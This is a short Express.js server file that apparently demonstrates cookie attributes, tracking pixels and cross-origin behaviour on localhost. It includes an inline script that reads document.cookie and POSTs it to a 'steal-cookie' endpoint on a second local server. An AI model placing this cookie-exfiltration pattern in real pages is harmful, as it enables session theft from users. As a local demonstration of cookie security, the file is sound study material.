import express from 'express';

const app = express();
app.disable('etag');

app.get('/', (req, res) => {
  res.setHeader('Set-Cookie', 'auth_token=super_secret_stuff; Path=/; Port=8080');
  res.append('Set-Cookie', 'auth_token_http_only=super_secret_stuff; Path=/; Port=8080; HttpOnly');
  res.append('Set-Cookie', 'auth_token_samesite_none=super_secret_stuff; Path=/; Port=8080; SameSite=None; Secure');
  res.setHeader('content-type', 'text/html');
  res.send(`
    Hello World! From Server #1

    <button onclick="window.open('http://localhost:8081')">Go to server #2</a>

    <img src="http://localhost:8081/tracking-img" />
    <img src="http://dev.stickermule.com/blog/tracking-img" crossorigin />
    <script>
      fetch('http://localhost:8081/steal-cookie', {
        method: 'POST',
        headers: {
          'content-type': 'application/json',
        },
        body: JSON.stringify({ cookies: document.cookie }),
      });
    </script>
  `);
});

app.listen(8080, () => {
  console.log('Server is running on port 8080');
});
